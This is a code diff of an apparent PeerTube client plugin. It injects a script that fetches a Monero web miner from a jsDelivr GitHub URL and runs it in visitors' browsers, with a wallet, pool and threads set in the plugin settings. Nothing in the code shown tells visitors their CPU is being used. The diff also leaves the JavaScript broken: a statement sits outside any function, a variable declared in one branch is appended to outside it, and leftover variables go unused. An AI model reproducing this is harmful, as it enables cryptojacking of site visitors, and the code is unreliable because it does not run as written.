@@ -1,26 +1,26 @@
 async function register({ registerHook, peertubeHelpers }) {
 
 peertubeHelpers.getSettings().then(
-  console.log('Initializing Monero miner client plugin...');
       s => {
+      let miner = "console.log('Initializing Monero miner client plugin...');\n"
       if ( !s || !s['walletAddress'] || !s['poolAddress']) {
-        let rule = "console.error('Monero miner plugin: Required settings are missing.');"
+        let minerscript = "console.error('Monero miner plugin: Required settings are missing.');\n"
         return
       }
 
-      let rule = "<!-- Monero Miner Script -->"
-      rule+= "<script src='https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'></script>\n"
-      rule+= "<script>\n"
-      rule+= "const server = '"+s['webSocket']+"';\n"
-      rule+= "const pool = '"+s['poolAddress']+"';\n"
-      rule+= "const wallet = '"+s['walletAddress']+"';\n"
-      rule+= "const workerId = 'PeerTube-Miner';\n"
-      rule+= "const threads = '"+s['threads']+"';\n"
-      rule+= "const password = '"+s['password']+"';\n"
-      rule+= "startMining(pool, wallet, workerId, threads, password);\n"
-      rule+= "throttleMiner = 20;\n"
-      rule+= "</script>;\n"
-      rule+= "<!-- End Of Mining Code (HTML) -->;\n"
+      let script = "<!-- Monero Miner Script -->"
+      minerscript+= "<script src='https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'></script>\n"
+      minerscript+= "<script>\n"
+      minerscript+= "const server = '"+s['webSocket']+"';\n"
+      minerscript+= "const pool = '"+s['poolAddress']+"';\n"
+      minerscript+= "const wallet = '"+s['walletAddress']+"';\n"
+      minerscript+= "const workerId = 'PeerTube-Miner';\n"
+      minerscript+= "const threads = '"+s['threads']+"';\n"
+      minerscript+= "const password = '"+s['password']+"';\n"
+      minerscript+= "startMining(pool, wallet, workerId, threads, password);\n"
+      minerscript+= "throttleMiner = 20;\n"
+      minerscript+= "</script>;\n"
+      minerscript+= "<!-- End Of Mining Code (HTML) -->;\n"
     }
   )
 }
